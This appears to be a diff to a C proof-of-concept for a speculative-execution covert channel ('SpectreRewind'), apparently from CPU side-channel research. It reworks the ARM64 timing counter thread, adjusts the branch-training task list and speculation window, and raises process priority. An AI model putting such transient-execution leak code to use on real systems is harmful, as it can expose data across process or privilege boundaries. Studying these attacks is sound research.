@@ -34,6 +34,8 @@
 #include <stdio.h>
 #include <pthread.h>
 #include <sys/mman.h>
+#include <sys/time.h>
+#include <sys/resource.h>
 
 /**************************************************************************
  * Public Definitions
@@ -50,7 +52,7 @@ typedef struct {
  * Global Variables
  **************************************************************************/
 static int dbg = 1;
-static volatile uint64_t* counter = 0;
+static volatile uint64_t counter __attribute__((aligned(4096))) = 0;
 static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
@@ -84,10 +86,9 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
 // ---------------------------------------------------------------------------
 #if defined(__aarch64__)
 static inline uint64_t rdtsc() {
-  asm volatile ("DSB SY");	
-  return *counter;
+  asm volatile ("DSB SY");
+  return counter;
 }
-
 #else // !__aarch64__	
 
 static inline uint64_t rdtsc() {
@@ -136,11 +137,7 @@ struct div_test *test_tasks[] = {
     &trainer,
     &trainer,
     &trainer,
-    &trainer,
-    &trainer,
     &transmit_0,
-    &trainer,
-    &trainer,
     &trainer,
     &trainer,
     &trainer,
@@ -177,7 +174,7 @@ int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
   // receiver: control the speculation window size
   for (int i = 0; i < N_DIVS; i++) {
     recv_num /= div;
-    // recv_num += 0;
+    recv_num += 0;
   }
   if (recv_num == 1) { // trained true, but false when sending
     if ( *ptr & (1 << bit_no) ) { // trained false, but true when sending
@@ -216,7 +213,7 @@ static void *countthread(void *dummy) {
   uint64_t local_counter = 0;
   while (1) {
     local_counter++;
-    *counter = local_counter;
+    counter = local_counter;
   }
 }
 
@@ -240,11 +237,6 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   transmit_1.div = 1;
   transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
   
-#if defined(__aarch64__)
-  counter = (volatile uint64_t *)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
-  int r = pthread_create(&count_thread, 0, countthread , 0);
-#endif
-
   int n_addr = sizeof(test_tasks)/sizeof(test_tasks[0]);
 
   bw_start = now_in_ns();
@@ -313,5 +305,22 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
 
 int main(int argc, char *argv[])
 {
+  if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
+    debug(ERROR, "priority -20 failed\n");
+  }
+#if defined(__aarch64__)
+  int r = pthread_create(&count_thread, 0, countthread , 0);
+  if (r != 0) {
+    return -1;
+  }
+  debug(INFO, "%s\n", "Waiting the counter thread...");
+  while(counter == 0) {
+    asm volatile("DSB SY");
+  }
+  debug(INFO, "Done: %ld\n", counter);
+#endif
+
   detect_spectrerewind_threshold();
+
+  return 0;
 }
